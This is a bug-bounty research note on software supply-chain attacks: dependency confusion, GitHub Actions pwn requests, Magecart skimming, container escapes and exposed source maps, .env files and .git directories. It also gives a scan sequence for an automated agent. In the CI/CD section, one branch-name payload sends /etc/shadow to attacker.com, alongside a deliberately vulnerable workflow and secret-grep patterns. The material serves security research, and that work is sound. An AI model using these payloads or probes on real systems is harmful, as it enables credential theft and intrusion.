# Supply Chain Vulnerability Analysis for Bug Bounty
## Research Cache: r6_2_supply_chain.md

---

## 1. Dependency Confusion Attacks

### How the Attack Works

Dependency confusion (also called namespace confusion) exploits how package managers resolve package names when both a private internal registry and a public registry (npm, PyPI, RubyGems) serve packages under the same name. The attack follows a consistent chain:

1. Researcher identifies internal package names used by the target (see enumeration techniques below)
2. A malicious package is published to the public registry under the same name but with a higher version number
3. The target's build system or developer machine pulls the public package instead of the private one, since version resolution defaults to the higher version
4. The malicious package executes arbitrary code at install time (via `postinstall` scripts in npm, `setup.py` in pip, or `.gemspec` for gem)

The original Alex Birsan research in 2021 earned over $100,000 USD from Apple, PayPal, Microsoft, and Tesla. The attack surface has expanded significantly since then.

**Netflix case (October 2024):** The internal package `nf-cl-logger` was targeted. Code execution was confirmed on developer laptops and CI runners before detection. This demonstrates the attack remains highly viable years after the original disclosure.

### Internal Package Name Enumeration - Where to Look

This is the critical intelligence-gathering step. Internal names surface in many places:

- **JavaScript bundles and source maps**: Package names appear in bundle metadata. Fetching `<target>/static/js/main.chunk.js.map` and running `unwebpack-sourcemap` against it often reveals the full `node_modules` dependency list including internal scoped packages
- **package.json / package-lock.json in public repos**: Engineers accidentally commit these, exposing private dependency names
- **npm error messages**: Broken build output in public CI logs shows attempted package resolutions
- **Docker image layers**: `docker history <image>` or layer inspection via `dive` reveals build-time commands including package installs
- **Job postings and engineering blogs**: References to internal tooling names
- **GitHub code search**: `org:<target> filename:package.json` often returns private org repos that have been made briefly public or whose package.json is indexed

**API Check Pattern (npm):**
```
GET https://registry.npmjs.org/<package-name>
```
A 404 response means the name is unclaimed. A 200 response with a creation date after your target's founding date is a red flag (squatter or attacker already claimed it).

**Python (PyPI) check:**
```
GET https://pypi.org/pypi/<package-name>/json
```

**RubyGems check:**
```
GET https://rubygems.org/api/v1/gems/<package-name>.json
```

### Detection Patterns by Ecosystem

**npm:**
- Unscoped packages with names matching internal tooling conventions (`company-logger`, `company-utils`, `internal-sdk`)
- Any package in `package.json` / `package-lock.json` not present in `https://registry.npmjs.org/`
- Packages using `@company/` scope where the npm org `company` is unclaimed
- Tool: `snync` - parses `package.json`, queries npm registry for each dep, flags unclaimed names

**pip / PyPI:**
- Requirements listed in `requirements.txt`, `setup.py`, `pyproject.toml` not present on PyPI
- Internal packages often use naming like `mycompany-core`, `mycompany-auth`
- `pip install --index-url` configurations in CI that reference private indexes

**gem:**
- `Gemfile` entries not present on `rubygems.org`
- Gemspec files in public repos that reference private gems

**Detection tool:** `KingOfBugbounty/Dependency-Confusion-Hunter` - Chrome extension that passively scans network requests for package.json references and checks npm registry in real time.

**Ostorlab source map technique:** Parse `.map` files from production bundles to enumerate all `node_modules` entries, then batch-check registry. This method caught approximately 5% of a sampled set of bug bounty program assets as vulnerable.

### Bounty Impact

Dependency confusion findings that demonstrate code execution (via a `postinstall` payload that makes an outbound HTTP callback) consistently land in the Critical tier. Programs that accept supply chain bugs typically pay $5,000-$30,000 AUD for confirmed execution. The key requirement is demonstrating RCE via DNS/HTTP callback - registering the package name alone is not sufficient proof.

---

## 2. CI/CD Pipeline Attacks

### Vulnerability Classes That Produce Bounties

#### 2a. GitHub Actions - pull_request_target Abuse (Pwn Requests)

This is the highest-yield CI/CD vulnerability class in current bug bounty programs. The `pull_request_target` trigger runs workflows in the context of the base repository - meaning it has access to repository secrets - even when the triggering PR comes from a fork.

**Vulnerable pattern:**
```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checkouts attacker-controlled code
      - run: npm install && npm test  # executes attacker code with access to secrets
```

The combination of `pull_request_target` + checkout of the PR head SHA is the canonical pwn-request configuration. The attacker submits a PR with a modified `postinstall` script or test file that exfiltrates `${{ secrets.GITHUB_TOKEN }}`, `AWS_ACCESS_KEY_ID`, or any other secret in the environment.

**Script injection via context variables:**
```yaml
- run: echo "Branch: ${{ github.event.pull_request.head.ref }}"
```
If the attacker names their branch `"; curl https://attacker.com/?x=$(cat /etc/shadow | base64)#"`, the unquoted interpolation executes the payload. Always look for unquoted `${{ }}` interpolation within `run:` steps.

**Real-world campaigns:**
- **GhostAction (September 2025)**: 327 GitHub users, 817 repositories compromised. 3,325 secrets stolen including PyPI tokens, npm tokens, and DockerHub tokens, all exfiltrated via HTTP POST
- **hackerbot-claw (February 2026)**: Autonomous bot that scanned for insecure `pull_request_target` configs at scale, achieved RCE on GitHub-hosted runners across multiple high-profile repositories
- **tj-actions/changed-files (CVE-2025-30066, March 2025)**: Widely used GitHub Action was compromised. The malicious payload dumped runner memory to workflow logs, exposing secrets from 23,000+ repositories

#### 2b. Exposed CI Configuration Files

CI configs frequently contain or reference secrets:

- `.travis.yml`, `.circleci/config.yml`, `.github/workflows/*.yml` in public repos
- Jenkins `Jenkinsfile` with hardcoded credentials or `withCredentials` blocks that log output
- GitLab `.gitlab-ci.yml` with `CI_JOB_TOKEN` misuse
- Exposed Jenkins instances at `<target>/jenkins/` or `<target>:8080/` - unauthenticated script console = RCE

**Detection recon:**
```
https://github.com/<org>/<repo>/blob/main/.github/workflows/
```
Enumerate all workflow files. Look for:
- `pull_request_target` trigger with checkout
- Unquoted context variable interpolation in `run:` steps
- `workflow_dispatch` with unvalidated inputs
- Self-hosted runners (persistent, higher-value target than ephemeral GitHub-hosted)

#### 2c. Artifact Poisoning

Build artifacts uploaded to registries (npm, PyPI, Docker Hub, Maven) during CI can be replaced if the registry credentials are stolen. The tj-actions incident specifically included artifact modification as part of the attack chain. Check if the target's published packages were signed with Sigstore/cosign - absence of signing means no integrity verification.

### What to Report

For CI/CD findings, the minimum viable PoC is:
1. Identify the vulnerable workflow file and line
2. Demonstrate secret access - either via a live callback (preferred) or by showing the secret value appears in publicly visible logs
3. If the program forbids triggering live workflows against production, show the code path analysis

---

## 3. Third-Party JavaScript Security

### Magecart and Supply Chain XSS

Magecart is the collective term for groups that compromise third-party JavaScript loaded by e-commerce and payment pages to skim credit card data. The attack vector is the third-party script, not the target website directly.

**2024 major incidents:**
- **Polyfill.io breach**: The `polyfill.io` CDN was acquired by a Chinese company that injected malicious code. 500,000+ websites that loaded `https://cdn.polyfill.io/v3/polyfill.min.js` were affected. The injected code redirected mobile users to scam sites based on user-agent and referrer conditions
- **Cisco CosmicSting (CVE-2024-34102)**: Cisco's merchandise site was hit via a Magento vulnerability. Attackers compromised a third-party analytics script loaded on checkout pages

**Modern attack anatomy:**
```
Attacker compromises CDN/analytics vendor
  -> Injects payload into vendor's JS
  -> Payload conditionally activates on checkout pages
  -> Exfiltrates form data (card numbers, CVV, billing address) to attacker domain
  -> Uses encoded/obfuscated POST requests to blend with legitimate traffic
```

### Detection Techniques for Bug Bounty

**Subresource Integrity (SRI) absence:**
```html
<!-- Vulnerable - no integrity check -->
<script src="https://cdn.example.com/analytics.js"></script>

<!-- Protected -->
<script src="https://cdn.example.com/analytics.js"
  integrity="sha384-..."
  crossorigin="anonymous"></script>
```
Missing SRI on third-party scripts loaded on payment or authentication pages is reportable. PCI DSS 4.0 (effective March 2025) now mandates monitoring of all scripts loaded on payment pages.

**Content Security Policy analysis:**
Overly permissive CSP headers that allow arbitrary external script sources (`script-src *` or missing `script-src`) are a bug bounty finding in conjunction with third-party script evidence.

**Network request analysis technique:**
1. Load the checkout/payment page with DevTools Network tab open
2. Filter to JS requests
3. Compare script hashes across multiple loads - any change indicates a possible compromise or lack of version pinning
4. Check if any loaded script domain resolves to infrastructure that changed ownership recently

**Google dork for exposed scripts:**
```
site:<target.com> filetype:js intext:"document.forms"
```

**Automated approach:**
Tools like Cloudflare Page Shield and F5 XC Client-Side Defense use ML to flag scripts exhibiting exfiltration behavior (form field access + external POST). As a researcher, you can replicate this manually by instrumenting `document.forms` and `XMLHttpRequest`/`fetch` in the browser console and watching for unexpected data flows.

---

## 4. Container Image Security

### Container-Level Bugs That Produce Bounties

Container security bugs fall into two distinct categories for bug bounty purposes: bugs in the container runtime itself (kernel-level), and misconfigurations in how containers are deployed.

#### 4a. Container Escape - Runtime Vulnerabilities (2025)

Three critical runC CVEs were disclosed:

- **CVE-2025-31133**: runC uses bind-mounting `/dev/null` to mask sensitive host files. Attacker replaces `/dev/null` with a symlink during container initialization, causing the mask to fail and exposing host paths
- **CVE-2025-52565**: Race condition on `/dev/console` bind mount via symlinks allows mounting unexpected targets before security protections initialize - can grant write access to procfs entries leading to breakout
- **CVE-2025-52881**: Arbitrary write via `/proc` redirect. Writes intended for `/proc` inside the container are redirected to attacker-controlled locations, allowing writes to `/proc/sysrq-trigger` and bypassing LSM protections

**Exploit requirement**: These require ability to start containers with custom mount configurations. The primary delivery vector is malicious container images or Dockerfiles. Fixed in runC 1.2.8, 1.3.3, 1.4.0-rc.3.

**CVE-2024-21626 (Leaky Vessels, runc)**: Earlier 2024 vulnerability allowing container escape via file descriptor leak. Container process could access host filesystem through `/proc/self/fd`.

#### 4b. Exposed Docker APIs and Registries

More commonly bounty-relevant than kernel escapes:

- **Unauthenticated Docker daemon**: `tcp://target:2375` with no TLS = full container control, trivial host escape via volume mount trick
- **Exposed private registries**: Registry at `registry.target.com` without authentication - pull images to find embedded secrets, source code, internal tooling
- **Misconfigured Kubernetes API server**: `https://k8s.target.com:6443` with anonymous access or overpermissioned ServiceAccount tokens

**Recon for exposed registries:**
```
https://registry.<target.com>/v2/
https://registry.<target.com>/v2/_catalog
```
A 200 response to `_catalog` without authentication is a Critical finding. Images often contain `.env` files baked in, SSH keys, AWS credential files left from build processes.

#### 4c. Secrets Baked into Images

```bash
docker pull <target-image>
docker history <target-image>
# Look for RUN commands with secrets
# Check each layer
docker save <target-image> | tar -xv
# Inspect each layer tarball for credential files
```

Tools: `truffleHog` and `detect-secrets` can be run against extracted image layers.

---

## 5. Build Artifact Analysis

### Source Map Exploitation

Source maps (`.map` files) are the single highest-ROI artifact for bug bounty reconnaissance. They map minified production JavaScript back to the original source, revealing:

- Internal API endpoint paths not documented or exposed elsewhere
- Authentication logic and token handling
- Hardcoded credentials, API keys, internal domain names
- Full dependency list including private packages (enables dependency confusion)
- Business logic that can be analyzed for authorization flaws

**Detection:**
```
https://target.com/static/js/main.chunk.js
-> Check for: //# sourceMappingURL=main.chunk.js.map
-> Fetch: https://target.com/static/js/main.chunk.js.map
```

**Google dork:**
```
site:target.com ext:js.map
ext:map intext:webpack intext:react site:target.com
```

**Tool: unwebpack-sourcemap**
```bash
python unwebpack_sourcemap.py https://target.com/static/js/main.chunk.js.map output_dir/
```
This reconstructs the entire source tree from the map file. The output is readable React/TypeScript/Vue source that can be audited for vulnerabilities.

**Real HackerOne case (Imgur, report #845677):** Exposed sourcemaps and unminified source code disclosed on HackerOne. Sourcemaps were accessible in production, revealing internal logic.

**GETTR case**: Full source map exposure led to discovery of an undocumented API endpoint that allowed password changes without proper authentication, plus hardcoded API keys.

### Webpack Bundle Direct Analysis (Without Source Maps)

Even without `.map` files, webpack bundles contain analyzable content:

```bash
# Install webpack-bundle-analyzer
npx webpack-bundle-analyzer stats.json

# Or: extract strings from bundle directly
strings main.chunk.js | grep -E "(https?://|api/|/v[0-9]/|Bearer|token|key|secret)"
```

**What to look for in bundles:**
- API base URLs for internal environments (`api.internal.target.com`, `staging.api.target.com`)
- JWT secrets or signing keys (occasionally hardcoded in client-side validation logic)
- Feature flags that gate admin functionality
- Third-party service API keys (Stripe test keys, SendGrid keys, Twilio SIDs)
- Internal GraphQL schema fragments

### Exposed Build Directories

CI/CD pipelines sometimes push build artifacts to web-accessible locations:

```
https://target.com/dist/
https://target.com/build/
https://target.com/.git/    <- git repo exposure
https://target.com/vendor/
```

**`.git` directory exposure** remains one of the most impactful recon findings. Tools like `git-dumper` reconstruct the full repository from an exposed `.git` directory, giving access to the entire commit history including deleted secrets.

```bash
git-dumper https://target.com/.git/ output_dir/
cd output_dir && git log --all --oneline
git grep -i "password\|secret\|key\|token"
```

### Environment File Exposure

The Unit42 research documented a campaign that mass-scanned for `.env` files across 230+ million domains. Findings from open S3 buckets containing `.env` files included:
- 1,185 unique AWS access keys
- 333 PayPal OAuth tokens
- 235 GitHub tokens
- 111 HubSpot API keys

**Recon targets:**
```
https://target.com/.env
https://target.com/.env.production
https://target.com/.env.local
https://target.com/api/.env
https://target.com/backend/.env
```

**S3 bucket artifact exposure:**
JavaScript files often reference S3 asset URLs. Extract the bucket name from URLs like `https://mybucket.s3.amazonaws.com/` and attempt:
```
GET https://mybucket.s3.amazonaws.com/?list-type=2
```
If the bucket allows public listing, enumerate all objects. Look for:
- Backup files: `database.sql.gz`, `backup.tar.gz`
- Build artifacts with embedded credentials
- Previous versions of `.env` files

---

## 6. Automated Detection Strategy for Project Triage

### Priority Scan Sequence

The following sequence maximizes ROI for supply chain recon in an automated agent:

**Phase 1 - Passive artifact collection (no active probing):**
1. Fetch homepage, extract all `<script src>` tags - catalog third-party domains
2. Fetch JS bundles, check for `sourceMappingURL` comments
3. Fetch each `.map` URL if present
4. Check common paths: `/.git/HEAD`, `/.env`, `/package.json`, `/composer.json`

**Phase 2 - Source map analysis:**
1. If map files found: run unwebpack-sourcemap extraction
2. Grep output for secrets patterns (`/[A-Za-z0-9+/]{40}/`, `sk-`, `AKIA`, `ghp_`)
3. Extract all API endpoint paths for further testing
4. Extract all package names - batch check against npm/PyPI registry

**Phase 3 - CI/CD enumeration:**
1. Check `https://github.com/<org>/<repo>/.github/workflows/` for all discovered GitHub orgs
2. Flag any workflow using `pull_request_target`
3. Check for self-hosted runner usage (higher impact)
4. Check for unpinned action references (`uses: actions/checkout@main` vs `@v4`)

**Phase 4 - Registry/container recon:**
1. Test `https://registry.<target-domain>/v2/` and `/_catalog`
2. Check for exposed Docker daemon ports (2375, 2376) in scope
3. Check for Kubernetes API exposure (6443, 8443, 443 on k8s subdomain)

### Severity Mapping

| Finding | Typical Severity | Bounty Range (AUD) |
|---|---|---|
| Dependency confusion with DNS callback | Critical | $7,500 - $50,000 |
| GitHub Actions pwn-request with secret exfil | Critical | $5,000 - $30,000 |
| Source map with hardcoded secrets | High-Critical | $3,000 - $15,000 |
| Exposed private registry (no auth) | High | $3,000 - $10,000 |
| Container escape via CVE | High-Critical | $5,000 - $25,000 |
| Exposed `.env` with credentials | High | $2,500 - $10,000 |
| Magecart-style third-party script injection | Critical | $10,000 - $50,000 |
| Source map exposure (no secrets, but recon value) | Informational-Low | $0 - $500 |

---

## Sources

- [Alex Birsan - Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [Netflix Vulnerability: Dependency Confusion in Action (2025)](https://www.landh.tech/blog/20250610-netflix-vulnerability-dependency-confusion/)
- [Dependency Confusion: Detection and Risk Mitigation 2025](https://protsenko.dev/2025/04/30/dependency-confusion-detection-mitigation-2025/)
- [Snyk - Detect and prevent dependency confusion attacks on npm](https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/)
- [Ostorlab - Mapping Dependency Confusion via Source Map Files](https://blog.ostorlab.co/mapping-dependency-confusion.html)
- [GitHub Actions Supply Chain Attack - tj-actions/changed-files (Unit42)](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/)
- [GitHub Action Compromise Puts CI/CD Secrets at Risk in 23,000 Repositories](https://thehackernews.com/2025/03/github-action-compromise-puts-cicd.html)
- [GitHub Security Lab - Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitGuardian - GhostAction Campaign: 3,325 Secrets Stolen](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/)
- [Orca Security - pull_request_nightmare Part 1](https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/)
- [Orca Security - pull_request_nightmare Part 2](https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/)
- [Sentry Security - Abusing Exposed Sourcemaps](https://blog.sentry.security/abusing-exposed-sourcemaps/)
- [rarecoil - SPA source code recovery by un-Webpacking source maps](https://medium.com/@rarecoil/spa-source-code-recovery-by-un-webpacking-source-maps-ef830fc2351d)
- [HackerOne - Imgur Sourcemaps disclosure #845677](https://hackerone.com/reports/845677)
- [Acunetix - Javascript Source map detected](https://www.acunetix.com/vulnerabilities/web/javascript-source-map-detected/)
- [DataDome - How to Prevent Magecart Attacks in 2025](https://datadome.co/learning-center/magecart-attacks/)
- [Cloudflare - Navigating the maze of Magecart](https://blog.cloudflare.com/navigating-the-maze-of-magecart/)
- [Sysdig - runc container escape vulnerabilities (CVE-2025-31133, CVE-2025-52565, CVE-2025-52881)](https://www.sysdig.com/blog/runc-container-escape-vulnerabilities)
- [CNCF - runc container breakout vulnerabilities technical overview](https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/)
- [Unit42 - Large-Scale Cloud Extortion Operation via Exposed .env Files](https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/)
- [TruffleHog - API Worm: Thousands of Secrets Found in Open S3 Buckets](https://trufflesecurity.com/blog/an-api-worm-in-the-making-thousands-of-secrets-found-in-open-s3-buckets)
- [jsmon.sh - S3 Bucket Takeover via JavaScript File](https://blogs.jsmon.sh/s3-bucket-takeover-via-javascript-file/)
- [BoostSecurity - The 2025 State of Pipeline Security](https://boostsecurity.io/blog/defensive-research-weaponized-the-2025-state-of-pipeline-security)
